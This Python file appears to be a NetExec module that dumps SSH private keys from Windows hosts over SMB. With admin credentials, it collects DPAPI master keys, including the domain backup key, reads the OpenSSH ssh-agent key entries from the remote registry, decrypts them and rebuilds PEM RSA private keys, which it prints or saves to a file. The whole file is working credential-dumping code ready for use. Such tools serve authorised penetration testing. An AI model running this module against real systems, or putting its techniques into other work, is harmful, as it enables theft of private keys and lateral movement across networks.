import base64
import traceback
from dploot.lib.target import Target
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5 import rrp
from impacket.dpapi import DPAPI_BLOB
from impacket.examples.secretsdump import RemoteOperations
from impacket.uuid import bin_to_string
from nxc.helpers.misc import CATEGORY
from nxc.protocols.smb.dpapi import collect_masterkeys_from_target, get_domain_backup_key, upgrade_to_dploot_connection
from pyasn1.type import univ
from pyasn1.codec.der import encoder


class NXCModule:
    """
    Extracts unencrypted private SSH keys from Windows OpenSSH ssh-agent registry entries.
    Keys are DPAPI-protected in HKCU:\\Software\\OpenSSH\\Agent\\Keys.

    Authors:
      mverschu: @mverschu (adapted for NetExec)
      soleblaze: https://github.com/NetSPI/sshkey-grab/blob/master/parse_mem.py
    """

    name = "ssh_keys"
    description = "Extract unencrypted private SSH keys from Windows OpenSSH ssh-agent registry entries (HKCU:\\Software\\OpenSSH\\Agent\\Keys)"
    supported_protocols = ["smb"]
    category = CATEGORY.CREDENTIAL_DUMPING

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options

    def options(self, context, module_options):
        """OUTPUTFILE       Output file to write extracted SSH private keys"""
        self.outputfile = None
        if "OUTPUTFILE" in module_options:
            self.outputfile = module_options["OUTPUTFILE"]

    def on_admin_login(self, context, connection):
        context.log.display("Extracting SSH keys from registry...")

        # Ensure connection has required attributes for DPAPI (no command execution - SMB/registry only)
        if not hasattr(connection, "pvkbytes"):
            connection.pvkbytes = None
        if not hasattr(connection, "no_da"):
            connection.no_da = None
        if not hasattr(connection, "args"):
            class Args:
                mkfile = None
                local_auth = False
            connection.args = Args()
        elif not hasattr(connection.args, "mkfile"):
            connection.args.mkfile = None
        if not hasattr(connection.args, "local_auth"):
            connection.args.local_auth = False
        for attr in ("password", "nthash", "lmhash"):
            if not hasattr(connection, attr):
                setattr(connection, attr, "")

        if connection.pvkbytes is None:
            connection.pvkbytes = get_domain_backup_key(connection)
            if connection.pvkbytes is False:
                connection.pvkbytes = None

        domain = connection.domain
        username = connection.username
        password = getattr(connection, "password", "") or ""
        lmhash = getattr(connection, "lmhash", "") or ""
        nthash = getattr(connection, "nthash", "") or ""
        kerberos = connection.kerberos
        aesKey = connection.aesKey
        use_kcache = getattr(connection, "use_kcache", False)
        remote_name = getattr(connection, "remoteName", connection.host if not kerberos else connection.hostname + "." + connection.domain)

        target = Target.create(
            domain=domain,
            username=username,
            password=password,
            target=remote_name,
            lmhash=lmhash,
            nthash=nthash,
            do_kerberos=kerberos,
            aesKey=aesKey,
            no_pass=True,
            use_kcache=use_kcache,
        )

        dploot_conn = upgrade_to_dploot_connection(target=target, connection=connection.conn)
        if dploot_conn is None:
            context.log.fail("Could not upgrade connection for dploot")
            return

        try:
            masterkeys = collect_masterkeys_from_target(connection, target, dploot_conn, user=True, system=True)
        except Exception as e:
            context.log.fail(f"Exception while collecting master keys: {e}")
            context.log.debug(traceback.format_exc())
            return

        if len(masterkeys) == 0:
            context.log.fail("No masterkeys looted, cannot decrypt SSH keys")
            return

        context.log.success(f"Collected {len(masterkeys)} master key(s) for DPAPI decryption")

        remote_ops = RemoteOperations(connection.conn, False)
        remote_ops.enableRegistry()

        try:
            # Open HKCU
            ans = rrp.hOpenCurrentUser(remote_ops._RemoteOperations__rrp)
            reg_handle = ans["phKey"]
            
            # Open the OpenSSH Agent Keys path
            try:
                ans = rrp.hBaseRegOpenKey(
                    remote_ops._RemoteOperations__rrp,
                    reg_handle,
                    "Software\\OpenSSH\\Agent\\Keys"
                )
                key_handle = ans["phkResult"]
            except Exception as e:
                context.log.fail(f"Could not open registry path HKCU:\\Software\\OpenSSH\\Agent\\Keys: {e}")
                context.log.info("This may indicate that OpenSSH ssh-agent is not being used or no keys are stored.")
                rrp.hBaseRegCloseKey(remote_ops._RemoteOperations__rrp, reg_handle)
                return

            # Enumerate all subkeys (each represents a stored SSH key)
            # Registry enumeration: iterate until DCERPCException (no more keys)
            key_names = []
            i = 0
            while True:
                try:
                    ans = rrp.hBaseRegEnumKey(remote_ops._RemoteOperations__rrp, key_handle, i)
                    key_name = ans["lpNameOut"].rstrip("\x00")  # Remove null terminator
                    if key_name:
                        key_names.append(key_name)
                    i += 1
                except DCERPCException:
                    break  # No more keys to enumerate

            if not key_names:
                context.log.info("No SSH keys found in registry")
                rrp.hBaseRegCloseKey(remote_ops._RemoteOperations__rrp, key_handle)
                rrp.hBaseRegCloseKey(remote_ops._RemoteOperations__rrp, reg_handle)
                return

            context.log.success(f"Found {len(key_names)} SSH key(s) in registry")

            # Extract keys
            extracted_keys = []
            for key_name in key_names:
                try:
                    # Open the subkey for this SSH key
                    ans = rrp.hBaseRegOpenKey(
                        remote_ops._RemoteOperations__rrp,
                        key_handle,
                        key_name
                    )
                    subkey_handle = ans["phkResult"]

                    # Read the encrypted data (default value) and comment
                    try:
                        # Get the default value (encrypted key data)
                        data_type, enc_data = rrp.hBaseRegQueryValue(
                            remote_ops._RemoteOperations__rrp,
                            subkey_handle,
                            ""
                        )
                        context.log.debug(f"Read registry data type: {data_type}, data length: {len(enc_data) if enc_data else 0}")
                        
                        # Get the comment value
                        try:
                            comment_type, comment_data = rrp.hBaseRegQueryValue(
                                remote_ops._RemoteOperations__rrp,
                                subkey_handle,
                                "comment"
                            )
                            if isinstance(comment_data, bytes):
                                comment = comment_data.decode('utf-8', errors='ignore').rstrip('\x00')
                            else:
                                comment = str(comment_data).rstrip('\x00')
                        except Exception as e:
                            context.log.debug(f"Could not read comment: {e}")
                            comment = key_name

                        # Convert encrypted data to bytes
                        if isinstance(enc_data, list):
                            enc_data = b''.join(enc_data) if enc_data else b''
                        elif not isinstance(enc_data, bytes):
                            enc_data = bytes(enc_data)

                        context.log.debug(f"Decrypting key: {comment}")
                        decrypted_data = self._decrypt_dpapi_remote(context, enc_data, masterkeys)

                        if decrypted_data:
                            decrypted_b64 = base64.b64encode(decrypted_data).decode('utf-8')
                            extracted_keys.append({
                                "comment": comment,
                                "data": decrypted_b64
                            })
                            context.log.success(f"Successfully extracted key: {comment}")
                        else:
                            context.log.fail(f"Failed to decrypt key: {comment}")

                    except Exception as e:
                        context.log.debug(f"Error reading key {key_name}: {e}")
                    finally:
                        rrp.hBaseRegCloseKey(remote_ops._RemoteOperations__rrp, subkey_handle)

                except Exception as e:
                    context.log.debug(f"Error processing key {key_name}: {e}")

            # Reconstruct and display RSA private keys
            if extracted_keys:
                # Center the header
                header_text = "Extracted SSH Private Keys:"
                separator = "=" * 80
                header_centered = header_text.center(80)
                
                context.log.display("\n" + separator)
                context.log.display(header_centered)
                context.log.display(separator + "\n")
                
                # Prepare keys for display and file output
                keys_to_save = []
                
                for key_data in extracted_keys:
                    private_key = self._extract_rsa_key(key_data["data"])
                    if private_key:
                        context.log.highlight(f"[+] Key Comment: {key_data['comment']}")
                        # Display key with proper indentation
                        for line in private_key.splitlines():
                            context.log.highlight(f"    {line}")
                        context.log.display("")
                        
                        # Store for file output
                        keys_to_save.append({
                            "comment": key_data['comment'],
                            "key": private_key
                        })
                    else:
                        context.log.fail(f"Could not reconstruct RSA key for: {key_data['comment']}")
                
                # Save to file if outputfile is specified
                if self.outputfile:
                    try:
                        with open(self.outputfile, "w") as fd:
                            for key_info in keys_to_save:
                                fd.write(f"# Key Comment: {key_info['comment']}\n")
                                fd.write(key_info['key'])
                                fd.write("\n\n")
                        context.log.success(f"Saved {len(keys_to_save)} SSH key(s) to {self.outputfile}")
                    except Exception as e:
                        context.log.fail(f"Failed to write keys to file {self.outputfile}: {e}")
            else:
                context.log.info("No keys were successfully extracted")

            rrp.hBaseRegCloseKey(remote_ops._RemoteOperations__rrp, key_handle)
            rrp.hBaseRegCloseKey(remote_ops._RemoteOperations__rrp, reg_handle)

        except Exception as e:
            context.log.fail(f"Error extracting SSH keys: {e}")
            context.log.debug(traceback.format_exc())
        finally:
            remote_ops.finish()

    def _normalize_guid(self, guid):
        """Normalize GUID for comparison: strip braces, lowercase."""
        if guid is None:
            return ""
        return str(guid).strip("{}").lower()

    def _decrypt_dpapi_remote(self, context, enc_data, masterkeys):
        """
        Decrypt DPAPI-protected data using master keys collected via SMB (no command execution).
        Uses RemoteOperations + dploot: registry read + SMB file read only.
        """
        if not masterkeys:
            return None
        try:
            blob = DPAPI_BLOB(enc_data)
            guid_masterkey = self._normalize_guid(bin_to_string(blob["GuidMasterKey"]))
            available_guids = []
            right_key = None
            for mk in masterkeys:
                guid, key = None, None
                if hasattr(mk, "guid") and hasattr(mk, "key") and mk.key is not None:
                    guid = self._normalize_guid(mk.guid)
                    key = mk.key
                elif isinstance(mk, tuple) and len(mk) >= 2:
                    guid = self._normalize_guid(mk[0])
                    key = mk[1]
                if guid:
                    available_guids.append((guid, getattr(mk, "user", None)))
                if guid and key and guid == guid_masterkey:
                    right_key = key
                    break
            if right_key is not None:
                decrypted = blob.decrypt(right_key)
                return decrypted
            context.log.info(f"No matching master key: blob needs {guid_masterkey}")
            context.log.debug(f"Available masterkeys (guid, user): {available_guids}")
        except Exception as e:
            context.log.debug(f"DPAPI decryption error: {e}")
            context.log.debug(traceback.format_exc())
        return None

    def _extract_rsa_key(self, data):
        """
        Extract RSA private key from base64 decoded data.
        Based on the implementation by soleblaze from sshkey-grab.
        """
        try:
            keybytes = base64.b64decode(data)
            offset = keybytes.find(b"ssh-rsa")
            if offset == -1:
                return None
            
            keybytes = keybytes[offset:]

            # Extract RSA key components from binary format
            # Format: [4 bytes: "ssh-rsa" length][7 bytes: "ssh-rsa"][2 bytes: n size][n bytes: n][2 bytes: e size][e bytes: e]...
            start = 10  # Skip "ssh-rsa" (4+7 bytes) and start reading components
            # Each component is prefixed with 2-byte big-endian size
            size = int.from_bytes(keybytes[start:(start+2)], byteorder='big')
            start += 2
            n = int.from_bytes(keybytes[start:(start+size)], byteorder='big')  # Modulus
            start = start + size + 2
            size = int.from_bytes(keybytes[start:(start+2)], byteorder='big')
            start += 2
            e = int.from_bytes(keybytes[start:(start+size)], byteorder='big')  # Public exponent
            start = start + size + 2
            size = int.from_bytes(keybytes[start:(start+2)], byteorder='big')
            start += 2
            d = int.from_bytes(keybytes[start:(start+size)], byteorder='big')  # Private exponent
            start = start + size + 2
            size = int.from_bytes(keybytes[start:(start+2)], byteorder='big')
            start += 2
            c = int.from_bytes(keybytes[start:(start+size)], byteorder='big')  # Coefficient (q^-1 mod p)
            start = start + size + 2
            size = int.from_bytes(keybytes[start:(start+2)], byteorder='big')
            start += 2
            p = int.from_bytes(keybytes[start:(start+size)], byteorder='big')  # Prime 1
            start = start + size + 2
            size = int.from_bytes(keybytes[start:(start+2)], byteorder='big')
            start += 2
            q = int.from_bytes(keybytes[start:(start+size)], byteorder='big')  # Prime 2

            # Calculate CRT exponents (used for faster decryption)
            e1 = d % (p - 1)  # d mod (p-1)
            e2 = d % (q - 1)  # d mod (q-1)

            # Construct ASN.1 structure for PKCS#1 RSA private key format
            # Sequence contains: version(0), n, e, d, p, q, e1, e2, c
            seq = (
                univ.Integer(0),  # Version
                univ.Integer(n),  # Modulus
                univ.Integer(e),  # Public exponent
                univ.Integer(d),  # Private exponent
                univ.Integer(p),  # Prime 1
                univ.Integer(q),  # Prime 2
                univ.Integer(e1), # Exponent 1 (d mod (p-1))
                univ.Integer(e2), # Exponent 2 (d mod (q-1))
                univ.Integer(c),  # Coefficient (q^-1 mod p)
            )

            # Build ASN.1 sequence structure
            struct = univ.Sequence()
            for i in range(len(seq)):
                struct.setComponentByPosition(i, seq[i])
            
            # Encode to DER format and base64 encode
            raw = encoder.encode(struct)
            data_b64 = base64.b64encode(raw).decode('utf-8')

            # Format as PEM (base64 with 64-char lines, wrapped in headers)
            width = 64  # PEM standard: 64 characters per line
            chopped = [data_b64[i:i + width] for i in range(0, len(data_b64), width)]
            top = "-----BEGIN RSA PRIVATE KEY-----\n"
            content = "\n".join(chopped)
            bottom = "\n-----END RSA PRIVATE KEY-----"
            return top + content + bottom

        except Exception as e:
            # Note: context not available here, but errors are handled by caller
            return None
